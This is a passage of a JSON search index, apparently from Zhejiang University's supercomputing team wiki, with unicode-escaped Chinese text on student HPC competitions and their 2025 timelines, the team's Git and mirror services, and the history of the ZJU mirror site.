\u4e16\u754c\u7684\u4e00\u6b21\u6df1\u5ea6\u6f5c\u6c34  \u6211\u4eec\u76f8\u4fe1\uff0c\u613f\u610f\u8e0f\u8fdb\u8fd9\u4e2a\u4e16\u754c\u7684\u4f60  \u4e00\u5b9a\u80fd\u5e26\u7740\u6ee1\u8f7d\u800c\u5f52\u7684\u6210\u679c\u6d6e\u51fa\u6c34\u9762  \ud83c\udf93 \u6b22\u8fce\u6765\u5230 HPC101\uff01  \u6211\u4eec\u4e00\u8d77\u5f00\u542f\u8fd9\u573a\u9ad8\u6027\u80fd\u7684\u590f\u5b63\u63a2\u7d22\u4e4b\u65c5\uff01"},{"location":"competition/","title":"\u7ade\u8d5b","text":""},{"location":"competition/#\u7ade\u8d5b","title":"\u7ade\u8d5b","text":"<p>\u672c\u6587\u6863\u4ec5\u7528\u4e8e\u5b58\u653e\u7ade\u8d5b\u8d5b\u9898\u3001\u8d5b\u7a0b\u3001\u6392\u540d\u7b49\u4fe1\u606f\uff0c\u8d5b\u9898\u89e3\u7b54\u7b49\u6280\u672f\u8d44\u6599\u4e0d\u5bf9\u5916\u516c\u5f00\uff0c\u89c1\u5185\u90e8\u6587\u6863\u3002</p>"},{"location":"competition/#\u65f6\u95f4\u8f74","title":"\u65f6\u95f4\u8f74","text":"2025 Q1 Q2 Q3 Q4 Mar Apr May Jun Jul Aug Sep Oct Nov <p>ISC25</p> In-Person Opening Ceremony Award Ceremony <p>SCC &amp; IndySCC</p> Getting Started \u7814\u8ba8\u4f1a IndySCC \u7533\u8bf7\u5f00\u653e IndySCC \u7533\u8bf7\u622a\u6b62 IndySCC \u901a\u77e5\u53d1\u9001 IndySCC \u6bd4\u8d5b <p>PAC 2025</p> \u62a5\u540d\u622a\u6b62 &amp; \u521d\u8d5b\u8d5b\u9898\u53d1\u5e03 \u521d\u8d5b\u622a\u6b62\u65e5\u671f \u51b3\u8d5b\u4efb\u52a1\u53d1\u5e03 \u51b3\u8d5b\u63d0\u4ea4\u622a\u6b62 <p>SolverChallenge25</p> \u4efb\u52a1\u516c\u5e03 \u62a5\u540d\u622a\u6b62 \u63d0\u4ea4\u622a\u6b62 \u7b54\u8fa9\u548c\u9881\u5956"},{"location":"competition/#\u7ade\u8d5b\u6392\u540d","title":"\u7ade\u8d5b\u6392\u540d","text":"<p>HPC Advisory Council \u7ef4\u62a4\u4e86\u5168\u7403\u9ad8\u6821\u5728\u4e09\u5927\u8d85\u7b97\u7ade\u8d5b\u7684\u6392\u540d\uff0c\u89c1 Worldwide Leadership List - HPC Advisory Council\u3002</p>"},{"location":"competition/#\u7ade\u8d5b\u603b\u89c8","title":"\u7ade\u8d5b\u603b\u89c8","text":"<p>\u8d85\u7b97\u76f8\u5173\u7684\u7ade\u8d5b\u4e00\u822c\u4f5c\u4e3a\u5927\u578b\u4f1a\u8bae\u7684\u4e00\u4e2a\u5b50\u9879\u76ee\u5b58\u5728\u3002\u6bd4\u5982\u8457\u540d\u7684 ASC\u3001ISC\u3001SCC \u7ade\u8d5b\u5206\u522b\u5bf9\u5e94\u4e9a\u6d32\u3001\u6b27\u6d32\u3001\u7f8e\u6d32\u7684\u8d85\u7b97\u4f1a\u8bae\uff0cSolverChallenge\uff08\u7b2c\u56db\u5c4a\u7ebf\u6027\u89e3\u6cd5\u5668\u7b97\u6cd5\u4e0e\u6027\u80fd\u4f18\u5316\u7ade\u8d5b\uff09\u662f\u89e3\u6cd5\u5668\u5feb\u901f\u7b97\u6cd5\u53ca\u5e94\u7528\u7814\u8ba8\u4f1a\uff08SOLVER \u4f1a\u8bae\uff09\u7684\u6d3b\u52a8\u7b49\u3002</p>"},{"location":"competition/#scc-\u4e0e-indyscc","title":"SCC \u4e0e IndySCC","text":"<p>SC Conference \u662f\u7f8e\u6d32\u6700\u5927\u7684\u9ad8\u6027\u80fd\u8ba1\u7b97\u4f1a\u8bae\uff0c\u6bcf\u5e74 11 \u6708\u5728\u7f8e\u56fd\u4e3e\u529e\u3002</p> <p>\u8be5\u4f1a\u8bae\u4e0b\u8bbe\u4e24\u4e2a\u5b66\u751f\u7ade\u8d5b\u9879\u76ee\uff1a</p> <p>Student Cluster Competition (SCC)</p> <p>With sponsorship from hardware and software vendor partners, competing student teams design and build small clusters, learn scientific applications, and apply optimization techniques for their chosen architectures in a non-stop, 48-hour challenge.</p> <p>SCC \u662f\u4e00\u4e2a 48 \u5c0f\u65f6\u7684\u6bd4\u8d5b\uff0c\u53c2\u8d5b\u961f\u4f0d\u9700\u8981\u5728\u6bd4\u8d5b\u73b0\u573a\u7ec4\u88c5\u4e00\u53f0\u5c0f\u578b\u8d85\u7b97\uff0c\u5e76\u5728\u6bd4\u8d5b\u671f\u95f4\u8fd0\u884c\u4e00\u4e9b\u79d1\u5b66\u5e94\u7528\u7a0b\u5e8f\uff0c\u6700\u7ec8\u83b7\u5f97\u6700\u9ad8\u7684\u6027\u80fd\u3002</p> <p>IndySCC</p> <p>The IndySCC is an event sharing the goals of the SCC but with an emphasis on education and inclusion, intended for less-experienced teams. Teams compete remotely using provided hardware through an education-focused experience supported by HPC industry experts during the months leading up to the conference. A 48-hour contest the weekend prior to SC will be the culmination of the experience and knowledge gained by the teams in the preceding months.</p> <p>IndySCC \u662f SCC \u7684\u7b80\u5355\u7248\u672c\u3002\u53c2\u8d5b\u961f\u4f0d\u5728\u6bd4\u8d5b\u524d\u51e0\u4e2a\u6708\u901a\u8fc7\u8fdc\u7a0b\u8bbf\u95ee\u63d0\u4f9b\u7684\u786c\u4ef6\u8fdb\u884c\u5b66\u4e60\uff0c\u6700\u540e\u4f1a\u6709\u4e00\u4e2a 48 \u5c0f\u65f6\u7684\u6bd4\u8d5b\u4f5c\u4e3a\u524d\u51e0\u4e2a\u6708\u7684\u5b66\u4e60\u603b\u7ed3\u3002</p>"},{"location":"competition/#indyscc-24","title":"IndySCC 24","text":"<p>Student Cluster Competition \u2022 SC24</p> <ul> <li>scc24-hpl.pdf</li> <li>scc24-icon.pdf</li> <li>scc24-mystery.pdf</li> <li>scc24-namd.pdf</li> </ul>"},{"location":"competition/#isc-scc","title":"ISC SCC","text":"<p>International Supercomputing Conference \u662f\u6b27\u6d32\u6700\u5927\u7684\u9ad8\u6027\u80fd\u8ba1\u7b97\u4f1a\u8bae\uff0c\u6bcf\u5e74 5-6 \u6708\u5728\u6b27\u6d32\u4e3e\u529e\u3002</p> <p>\u8be5\u4f1a\u8bae\u4e0b\u8bbe\u4e00\u4e2a\u5b66\u751f\u7ade\u8d5b\u9879\u76ee\uff1a</p> <p>ISC SCC</p> <p>The ISC Student Cluster Competition encourages international teams of university students to showcase their expertise in a friendly yet spirited competition that fosters critical skills, professional relationships, competitive spirit and lifelong comraderies.</p> <p>The Competition is an integral part of the ISC event and ongoing success and growing recognition as a world championship competition are a result of the collaborative partnership between ISC and the HPC-AI Advisory Council.</p> <p>The virtual part will be open for all teams, the teams will be connecting to remote clusters and run HPC applications, performing benchmarks and participate in the given challenges.</p> <p>The in-person part will be open for up to seven teams. The onsite teams will bring and assemble their own cluster, and run the micro-benchmarks and HPC applications, within three days of the ISC High Performance Conference.</p> <p>ISC SCC \u5206\u4e3a Virtual Part \u548c In-Persion Part\u3002\u76ee\u524d\u6211\u4eec\u53c2\u52a0\u7684\u662f Virtual Part\uff0c\u6709\u5927\u7ea6\u4e00\u4e2a\u6708\u7684\u65f6\u95f4\u8fdc\u7a0b\u8bbf\u95ee\u63d0\u4f9b\u7684\u786c\u4ef6\u8fdb\u884c\u5b66\u4e60\u3002</p> <p>ISC SCC \u8d5b\u9898\u6709\u5b98\u65b9\u5728\u7ebf\u5b58\u6863\uff0c\u56e0\u6b64\u8fd9\u91cc\u4e0d\u518d\u7559\u6863\u3002</p>"},{"location":"competition/#isc-scc-25","title":"ISC SCC 25","text":"<p>ISC25 SCC - Virtual Part - HPC-Works - Confluence</p>"},{"location":"competition/#isc-scc-24","title":"ISC SCC 24","text":"<p>ISC24 SCC - Virtual Part - HPC-Works - Confluence</p>"},{"location":"competition/#asc","title":"ASC","text":"<p>Asia Supercomputer Community (ASC) \u662f\u4e9a\u6d32\u8d85\u7b97\u793e\u533a\uff0c\u6bcf\u5e74 4-5 \u6708\u5728\u4e2d\u56fd\u4e3e\u529e\u4e00\u6b21\u5b66\u751f\u7ade\u8d5b\u3002</p> <ul> <li>\u6bcf\u4e2a\u5b66\u6821\u6d3e\u51fa\u591a\u652f\u961f\u4f0d\u53c2\u8d5b\uff0c\u6bcf\u652f\u961f\u4f0d 5 \u540d\u672c\u79d1\u751f\u548c 1 \u4f4d\u6307\u5bfc\u8001\u5e08\u3002</li> <li>\u6bcf\u4e2a\u5b66\u6821\u6700\u591a\u4e00\u652f\u961f\u4f0d\u8fdb\u5165\u51b3\u8d5b\u3002</li> <li>\u51b3\u8d5b\u8d5b\u9898\u4e00\u822c\u5305\u542b\uff1abenchmark\u3001\u5e94\u7528\u8c03\u4f18\u3001\u56e2\u961f\u8d5b\u9898\u3001e Prize\u3002</li> </ul>"},{"location":"competition/#asc-25","title":"ASC 25","text":"<ul> <li>asc25-pre-round</li> </ul>"},{"location":"competition/#asc-24","title":"ASC 24","text":"<p>ASC24 Final</p> <ul> <li>asc24-group</li> </ul>"},{"location":"competition/#pac","title":"PAC","text":"<p>\u5168\u56fd\u5e76\u884c\u5e94\u7528\u6311\u6218\u8d5b ParallelApplicationChallenge\uff08\u4ee5\u4e0b\u7b80\u79f0\u201c\u7ade\u8d5b\u201d\u6216\u8005\u201cPAC\u201d\uff09\u7531\u5168\u56fd\u4fe1\u6807\u59d4\u7b97\u529b\u6807\u51c6\u5de5\u4f5c\u7ec4\u6307\u5bfc\uff0cACM \u4e2d\u56fd\u9ad8\u6027\u80fd\u8ba1\u7b97\u4e13\u5bb6\u59d4\u5458\u4f1a\u548c\u4e2d\u56fd\u667a\u80fd\u8ba1\u7b97\u4ea7\u4e1a\u8054\u76df\u4e3b\u529e\u3002\u7ade\u8d5b\u81ea 2013 \u5e74\u521b\u529e\u4ee5\u6765\uff0c\u83b7\u5f97\u4e86\u6e05\u534e\u5927\u5b66\u3001\u5317\u4eac\u5927\u5b66\u3001\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u3001\u5c71\u4e1c\u5927\u5b66\u3001\u4e2d\u56fd\u79d1\u5b66\u9662\u7b49\u56fd\u5185\u77e5\u540d\u9ad8\u6821\u3001\u79d1\u7814\u5355\u4f4d\u7684\u53c2\u8d5b\u652f\u6301\u3002\u73b0\u5df2\u9010\u6e10\u53d1\u5c55\u4e3a\u56fd\u5185\uff08\u542b\u6e2f\u6fb3\u53f0\uff09\u5f71\u54cd\u529b\u6700\u5927\u7684\u5e76\u884c\u8ba1\u7b97\u8d5b\u4e8b\u4e4b\u2f00\u3002</p> <p>PAC \u4e00\u822c\u5728\u6bcf\u5e74 6-8 \u6708\u4e3e\u884c\uff0c\u5206\u4e3a\u201c\u5e76\u884c\u4f18\u5316\u8d5b\u9053\u201d\u548c\u201c\u5e76\u884c\u5e94\u7528\u8d5b\u9053\u201d\u4e24\u4e2a\u8d5b\u9053\uff0c\u6211\u4eec\u4e00\u822c\u53c2\u52a0\u201c\u5e76\u884c\u4f18\u5316\u8d5b\u9053\u201d\u3002</p>"},{"location":"competition/#pac-2025","title":"PAC 2025","text":"<ul> <li>\u8d5b\u4e8b\u94fe\u63a5</li> <li>\u62a5\u540d\u622a\u6b62\u65e5\u671f &amp; \u521d\u8d5b\u8d5b\u9898\u53d1\u5e03\uff1a2025-06-15</li> <li>\u521d\u8d5b\u622a\u6b62\u65e5\u671f\uff1a2025-07-01</li> <li>\u51b3\u8d5b\u4efb\u52a1\u53d1\u5e03\uff1a2025-07-15</li> <li>\u51b3\u8d5b\u63d0\u4ea4\u622a\u6b62\uff1a2025-08-15</li> </ul>"},{"location":"competition/#solverchallenge","title":"SolverChallenge","text":"<p>SolverChallenge \u7ade\u8d5b\u662f\u89e3\u6cd5\u5668\u5feb\u901f\u7b97\u6cd5\u53ca\u5e94\u7528\u7814\u8ba8\u4f1a\uff08SOLVER \u4f1a\u8bae\uff09\u7684\u4e00\u9879\u7279\u8272\u6d3b\u52a8\uff0c\u7531 SOLVER \u4f1a\u8bae\u7ec4\u59d4\u4f1a\u4e3b\u529e\uff0c\u6bcf\u5e74\u4e3e\u884c\u4e00\u6b21\u3002\u7ade\u8d5b\u9488\u5bf9\u5b9e\u9645\u5e94\u7528\u4e2d\u62bd\u53d6\u51fa\u6765\u7684\u7ebf\u6027\u4ee3\u6570\u95ee\u9898\uff0c\u8981\u6c42\u53c2\u8d5b\u961f\u4f0d\u5728\u4e00\u5b9a\u7ea6\u675f\u6761\u4ef6\u4e0b\u901a\u8fc7\u7b97\u6cd5\u8bbe\u8ba1\u4e0e\u6027\u80fd\u8c03\u4f18\u7b49\u624b\u6bb5\u5bf9\u8fd9\u4e9b\u7cfb\u7edf\u8fdb\u884c\u6570\u503c\u6c42\u89e3\uff0c\u5e76\u57fa\u4e8e\u4e0d\u540c\u6807\u51c6\u4ece\u591a\u4e2a\u7ef4\u5ea6\u5bf9\u6240\u83b7\u7ed3\u679c\u8fdb\u884c\u8bc4\u4ef7\u3002</p> <p>SolverChallenge \u4e00\u822c\u5728 6-7 \u6708\u4efd\u4e3e\u884c\uff0c\u8d5b\u9898\u4e3b\u8981\u662f\u5728\u7ed9\u5b9a\u5e73\u53f0\u4e0a\u5bf9 10 \u4e2a\u7ebf\u6027\u7cfb\u7edf\u8fdb\u884c\u6c42\u89e3\uff0c\u4ee5\u6b63\u786e\u6027\u548c\u901f\u5ea6\u8ba1\u7b97\u5f97\u5206\u3002</p>"},{"location":"competition/#solverchallenge25","title":"SolverChallenge25","text":"<ul> <li>\u8d5b\u4e8b\u94fe\u63a5</li> <li>\u4efb\u52a1\u516c\u5e03\uff1a2025-05-15</li> <li>\u62a5\u540d\u622a\u6b62\uff1a2025-06-15</li> <li>\u63d0\u4ea4\u622a\u6b62\uff1a2025-07-15</li> <li>\u7b54\u8fa9\u548c\u9881\u5956\uff1a2025-08-02</li> </ul>"},{"location":"competition/#\u5148\u5bfc\u676f","title":"\u5148\u5bfc\u676f","text":"<p>\u5148\u5bfc\u676f\u5168\u56fd\u5927\u5b66\u751f\u9ad8\u6027\u80fd\u8ba1\u7b97\u5927\u8d5b\u662f\u7531\u4e2d\u56fd\u9ad8\u6027\u80fd\u8ba1\u7b97\u4ea7\u4e1a\u6280\u672f\u521b\u65b0\u6218\u7565\u8054\u76df\u4e3b\u529e\u7684\u5168\u56fd\u6027\u5927\u5b66\u751f\u9ad8\u6027\u80fd\u8ba1\u7b97\u8d5b\u4e8b\uff0c\u65e8\u5728\u63a8\u52a8\u9ad8\u6821\u9ad8\u6027\u80fd\u8ba1\u7b97\u4eba\u624d\u57f9\u517b\uff0c\u4fc3\u8fdb\u9ad8\u6821\u4e0e\u4f01\u4e1a\u7684\u4ea4\u6d41\u4e0e\u5408\u4f5c\u3002</p> <p>\u5148\u5bfc\u676f\u4e3b\u8981\u662f\u57fa\u4e8e\u56fd\u4ea7 CPU \u548c GPU \uff08\u6d77\u5149\uff09\u8fdb\u884c\u4f18\u5316\u3002</p>"},{"location":"competition/#\u5148\u5bfc\u676f-2025","title":"\u5148\u5bfc\u676f 2025","text":"<ul> <li>\u8d5b\u4e8b\u94fe\u63a5</li> <li>\u4efb\u52a1\u516c\u5e03\uff1a2025-05-17</li> <li>\u63d0\u4f9b\u8d26\u53f7\uff1a2025-06-17</li> <li>\u62a5\u540d\u622a\u6b62\uff1a2025-09-05</li> <li>\u521d\u8d5b\u622a\u6b62\uff1a2025-10-08</li> <li>\u51b3\u8d5b\u622a\u6b62\uff1a2025-11-10</li> </ul>"},{"location":"falcon/","title":"Falcon","text":""},{"location":"falcon/#falcon","title":"Falcon","text":"<p>Team Falcon \u96b6\u5c5e\u4e0e\u6d59\u6c5f\u5927\u5b66\u8d85\u7b97\u961f\uff08ZJUSCT\uff09\uff0c\u4e3a\u6d59\u6c5f\u5927\u5b66\u90e8\u5206\u670d\u52a1\u63d0\u4f9b\u6280\u672f\u652f\u6301\u3002</p> <p>\u6211\u4eec\u7ef4\u62a4\u7684\u670d\u52a1\u6709\uff1a</p> <ul> <li>\u6d59\u6c5f\u5927\u5b66 Git \u4ee3\u7801\u6258\u7ba1\u670d\u52a1\uff1aZJU Git (https://git.zju.edu.cn)</li> <li>\u6d59\u6c5f\u5927\u5b66\u5f00\u6e90\u8f6f\u4ef6\u955c\u50cf\u7ad9\uff1aZJU Mirrors (https://mirrors.zju.edu.cn)</li> </ul>"},{"location":"falcon/git/","title":"ZJU Git \u4ee3\u7801\u6258\u7ba1\u670d\u52a1","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/git/#zju-git-\u4ee3\u7801\u6258\u7ba1\u670d\u52a1","title":"ZJU Git \u4ee3\u7801\u6258\u7ba1\u670d\u52a1","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror-history/","title":"ZJU Mirror \u5386\u53f2","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror-history/#zju-mirror-\u5386\u53f2","title":"ZJU Mirror \u5386\u53f2","text":"<p>Abstract</p> <p>\u672c\u6587\u6863\u662f ZJU Mirror \u7684\u5386\u53f2\u8bb0\u5f55\uff0c\u5305\u542b\u4e86 ZJU Mirror \u7684\u53d1\u5c55\u5386\u7a0b\u3001\u7248\u672c\u66f4\u65b0\u548c\u91cd\u8981\u4e8b\u4ef6\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror-history/#\u53d1\u5c55\u5386\u7a0b","title":"\u53d1\u5c55\u5386\u7a0b","text":"<p>Quote</p> <ul> <li>\u5341\u5e74\uff0c\u6d59\u5927\u955c\u50cf\u7ad9\u7684\u53d8\u5316\uff0c\u4e5f\u804a\u804a\u6211\u5f00\u53d1\u7684\u8fc7\u7a0b - CC98 \u8bba\u575b</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror-history/#\u7b2c\u4e00\u4ee32013-2020","title":"\u7b2c\u4e00\u4ee3\uff082013-2020\uff09","text":"<p>\u6d59\u6c5f\u5927\u5b66\u6700\u65e9\u7684\u955c\u50cf\u7ad9\uff0c\u8bbe\u5907\u7531\u56fe\u4e66\u9986\u8001\u5e08\u5fd7\u613f\u7ef4\u62a4\uff0c\u5185\u5bb9\u7531 ZJULUG \u7ef4\u62a4\u3002ZJULUG \u6210\u5458\u5168\u90e8\u6bd5\u4e1a\u540e\uff0c\u7b2c\u4e00\u4ee3\u955c\u50cf\u7ad9\u65e0\u4eba\u7ef4\u62a4\u3002</p> <p></p> <p>\u7b2c\u4e00\u4ee3\u955c\u50cf\u7ad9\u7684\u524d\u7aef\u754c\u9762\uff1a</p> <p></p> <p></p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror-history/#\u7b2c\u4e8c\u4ee32021-2024","title":"\u7b2c\u4e8c\u4ee3\uff082021-2024\uff09","text":"<p>ZJUSCT Falcon \u63a5\u624b\uff0c\u5bf9\u955c\u50cf\u7ad9\u7684\u524d\u3001\u540e\u7aef\u90fd\u8fdb\u884c\u4e86\u91cd\u5199\uff0c\u65b0\u7684\u67b6\u6784\u5305\u542b\u4e86\u4e00\u4e2a\u7ba1\u63a7\u670d\u52a1\uff0c\u4f7f\u5f97\u6211\u4eec\u611f\u77e5\u3001\u8c03\u5ea6\u4efb\u52a1\u7684\u80fd\u529b\u66f4\u5f3a\u4e86\u3002</p> <p>2022 \u5e74 1 \u6708\u5de6\u53f3\uff0c\u955c\u50cf\u7ad9\u8fc1\u79fb\u4e0a\u4e91\uff0c\u4f7f\u7528\u5b66\u6821\u4fe1\u606f\u4e2d\u5fc3\u63d0\u4f9b\u7684 vSphere \u865a\u62df\u5316\u5e73\u53f0\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror-history/#ranunculz","title":"@RanunculZ","text":"<p>21 \u5e74\u7684\u65f6\u5019\uff0c\u8d85\u7b97\u961f\u6b63\u5f0f\u63a5\u624b\u4e86\u955c\u50cf\u7ad9\u7684\u5f00\u53d1\uff0c\u6211\u63a5\u4e86\u524d\u7aef\u7684\u6d3b\u3002\u5f53\u65f6\uff0c\u5361\u7247\u8bbe\u8ba1\u8fd8\u662f\u4e00\u4e2a\u6bd4\u8f83\u65b0\u7684 UI \u8bbe\u8ba1\u7406\u5ff5\uff0c\u6211\u4eec\u4e5f\u5e0c\u671b\u955c\u50cf\u7ad9\u80fd\u770b\u8d77\u6765\u66f4\u5e74\u8f7b\uff0c\u66f4\u73b0\u4ee3\u4e00\u4e9b\u3002\u8fd9\u662f\u955c\u50cf\u7ad9\u6700\u65e9\u671f\u7684 Figma \u539f\u578b\uff0c\u5c3d\u7ba1\u975e\u5e38\u7b80\u5355\uff0c\u4f46\u5df2\u7ecf\u6709\u4e86\u73b0\u5728\u5927\u5bb6\u770b\u5230\u7684\u955c\u50cf\u7ad9\u7f51\u9875\u7684\u96cf\u5f62\uff1a</p> <p></p> <p>\u6309\u7167\u5f53\u65f6\u7684 Figma \u539f\u578b\uff0c\u7f51\u9875\u4ec5\u4ec5\u662f\u628a\u540e\u7aef\u4f20\u8fc7\u6765\u7684\u6570\u7ec4\u4ee5\u5361\u7247\u7684\u5f62\u5f0f\u94fa\u5f00\u800c\u5df2\u30029 \u6708\u4efd\u5f00\u5b66\u7684\u65f6\u5019\uff0c\u6211\u7cca\u4e86\u4e00\u4e24\u5929\uff0c\u5927\u6982\u7cca\u51fa\u6765\u4e86\u4e2a\u6837\u5b50\uff1a</p> <p></p> <p></p> <p>2021 \u5e74 12 \u6708 31 \u65e5\uff0c\u7a81\u7136\u5fc3\u8840\u6765\u6f6e\uff0c\u60f3\u7740\u8981\u4e0d\u7136\u628a\u955c\u50cf\u7ad9\u65b0\u7f51\u9875\u5148\u4e0a\u7ebf\u4e86\uff0c\u5f53\u505a\u7ed9\u5927\u5bb6\u7684\u65b0\u5e74\u793c\u7269\uff1a</p> <p></p> <p>\u65b0\u7f51\u9875\u5176\u5b9e\u53ea\u662f\u505a\u5230\u4e86\u201c\u53ef\u4f7f\u7528\u201d\uff0c\u5f00\u53d1\u8fc7\u7a0b\u975e\u5e38\u654f\u6377\uff0cUI \u8fd8\u53ef\u4ee5\u7ee7\u7eed\u6253\u78e8\u3002\u4e8e\u662f\uff0c\u6211\u4eec\u9080\u8bf7\u4e86\u6821\u5916\u6bd4\u8f83\u61c2\u8bbe\u8ba1\u7684\u670b\u53cb\uff0c\u5e2e\u52a9\u955c\u50cf\u7ad9\u51fa\u8c0b\u5212\u7b56\u3002\u8fd9\u662f\u7ecf\u8fc7\u6539\u826f\u540e\u7684 Figma \u539f\u578b\uff08\u554a\u8fd9\uff0c\u600e\u4e48\u6709\u4e24\u4e2a docker \u9cb8\u9c7c\uff09\uff1a</p> <p></p> <p>\u57fa\u4e8e\u65b0\u7684\u539f\u578b\uff0c\u5728\u4e0d\u65ad\u6253\u78e8\u540e\uff0c\u955c\u50cf\u7ad9\u7ec8\u4e8e\u53d8\u6210\u4e86\u5b83\u4eca\u5929\u7684\u6837\u5b50\uff1a</p> <p></p> <p>\u8fd9\u671f\u95f4\uff0c\u4e5f\u8fdb\u884c\u4e86 logo \u7684\u8bbe\u8ba1\u3002\u8d85\u7b97\u961f\u4e0d\u6b62\u6709\u955c\u50cf\u7ad9\u4e00\u4e2a\u4ea7\u54c1\uff0c\u8fd8\u6709 git \u6258\u7ba1\u5e73\u53f0\uff0c\u672a\u6765\u8fd8\u53ef\u80fd\u6709\u5176\u4ed6\u4ea7\u54c1\uff0c\u6240\u4ee5\u5e0c\u671b\u5404\u4e2a\u4ea7\u54c1\u4e4b\u95f4\u80fd\u770b\u8d77\u6765\u7edf\u4e00\u4e00\u4e9b\u3002\u603b\u4f53\u7684\u601d\u8def\uff0c\u8fd8\u662f\u5e0c\u671b\u955c\u50cf\u7ad9\u80fd\u770b\u8d77\u6765\u6bd4\u8f83\u5e74\u8f7b\u3001\u73b0\u4ee3\u3002\u6bd4\u5982\u955c\u50cf\u7ad9\u6807\u9898\u7684\u82f1\u6587\u5b57\u4f53\uff0c\u6211\u770b\u56fd\u5185\u5916\u5934\u90e8\u4e92\u8054\u7f51\u4f01\u4e1a\u6700\u8fd1\u7684 logo \u90fd\u6bd4\u8f83\u504f\u7b80\u7ea6\u3001\u51e0\u4f55\u98ce\u683c\uff0c\u4e8e\u662f\u5c31\u4e13\u95e8\u6311\u4e86\u7b26\u5408\u8fd9\u4e00\u98ce\u683c\u7684\u5f00\u6e90\u5b57\u4f53\u3002\u7ecf\u8fc7\u63a2\u8ba8\u4ee5\u53ca\u670b\u53cb\u4eec\u7684\u5e2e\u52a9\uff0c\u5c0f logo \u6700\u540e\u7684\u6837\u5b50\uff1a</p> <p></p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror-history/#\u7b2c\u4e09\u4ee32025-\u81f3\u4eca","title":"\u7b2c\u4e09\u4ee3\uff082025-\u81f3\u4eca\uff09","text":"<p>2025 \u5e74\uff0c\u501f AIRA \u534f\u4f1a\u6210\u7acb\uff0c\u6211\u4eec\u91cd\u65b0\u6210\u7acb\u4e86 ZJULUG\uff0c\u5f00\u59cb\u62db\u7eb3\u975e\u8d85\u7b97\u961f\u6210\u5458\u53c2\u4e0e\u955c\u50cf\u7ad9\u8fd0\u7ef4\u5de5\u4f5c\u3002\u540c\u65f6\uff0c\u5728\u4fe1\u606f\u6280\u672f\u4e2d\u5fc3\u7684\u652f\u6301\u4e0b\uff0c\u6211\u4eec\u5c06\u955c\u50cf\u7ad9\u4ece\u4e91\u5e73\u53f0\u8fc1\u79fb\u5230\u7269\u7406\u673a\u4e0a\u3002\u65b0\u7684\u786c\u4ef6\u8bbe\u65bd\u5c06\u4e3a\u955c\u50cf\u7ad9\u63d0\u4f9b\u66f4\u9ad8\u7684\u6027\u80fd\u548c\u7a33\u5b9a\u6027\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror-history/#\u5386\u5c4a\u955c\u50cf\u7ad9\u7ef4\u62a4\u8005","title":"\u5386\u5c4a\u955c\u50cf\u7ad9\u7ef4\u62a4\u8005","text":"\u5c4a\u522b\uff08\u6309\u672c\u79d1\u8ba1\u7b97\uff09 \u7ef4\u62a4\u8005 17 \u7ea7 \u4fde\u70af\u5f1b 18 \u7ea7 \u5f20\u6881\u80b2\u3001\u5434\u90c1\u975e\u3001\u66fe\u5145 19 \u7ea7 \u8d75\u7d2b\u5bb8\u3001\u9648\u6613\u3001\u6768\u5b50\u6657 22 \u7ea7 \u6731\u5b9d\u6797\u3001\u674e\u6668\u6f47 23 \u7ea7 \u90dd\u661f\u661f 24 \u7ea7","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror/","title":"ZJU Mirror \u955c\u50cf\u7ad9","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror/#zju-mirror-\u955c\u50cf\u7ad9","title":"ZJU Mirror \u955c\u50cf\u7ad9","text":"<p>Abstract</p> <p>\u672c\u6587\u6863\u662f ZJU Mirror \u6700\u65b0\u7684\u4fe1\u606f\u8bb0\u5f55\u548c\u8fd0\u7ef4\u624b\u518c\u3002\u5173\u4e8e Mirror \u7684\u5386\u53f2\u548c\u5df2\u5e9f\u5f03\u7684\u8fd0\u7ef4\u4fe1\u606f\uff0c\u89c1 ZJU Mirror \u5386\u53f2\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror/#\u7b80\u4ecb","title":"\u7b80\u4ecb","text":"<p>\u6d59\u6c5f\u5927\u5b66\u5f00\u6e90\u8f6f\u4ef6\u955c\u50cf\u7ad9 (https://mirrors.zju.edu.cn) \u662f\u7531 \u6d59\u6c5f\u5927\u5b66\u4fe1\u606f\u4e2d\u5fc3 \u652f\u6301\u3001\u6d59\u6c5f\u5927\u5b66\u8d85\u7b97\u961f \u8fd0\u8425\u7684\uff0c\u81f4\u529b\u4e8e\u666e\u53ca\u5f00\u6e90\u8f6f\u4ef6\u3001\u65b9\u4fbf\u6821\u5185\u5916\u7528\u6237\u9ad8\u6548\u8bbf\u95ee\u5f00\u6e90\u9879\u76ee\u7684\u5404\u79cd\u8d44\u6e90\u7684\u975e\u8425\u5229\u8ba1\u5212\u3002\u672c\u955c\u50cf\u7ad9\u63d0\u4f9b\u4e86\u5305\u62ec Docker\u3001PostgreSQL\u3001Ubuntu \u7b49\u9879\u76ee\u7684\u955c\u50cf\uff0c\u4ee5\u670d\u52a1\u6559\u80b2\u548c\u79d1\u5b66\u7814\u7a76\u4e3a\u76ee\u7684\uff0c\u63d0\u5021\u81ea\u7531\u3001\u5e73\u7b49\u3001\u534f\u4f5c\u3001\u5171\u4eab\u7684\u7cbe\u795e\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"falcon/mirror/#\u4e30\u5bcc\u7684\u955c\u50cf","title":"\u4e30\u5bcc\u7684\u955c\u50cf","text":"<p>\u6d59\u5927\u955c\u50cf\u7ad9\u62e5\u6709 50+ \u4e2a\u955c\u50cf\uff0c\u5305\u62ec Anaconda\u3001Ubuntu\u3001Pypi\u3001ArchLinux\u3001Debian\u3001Homebrew 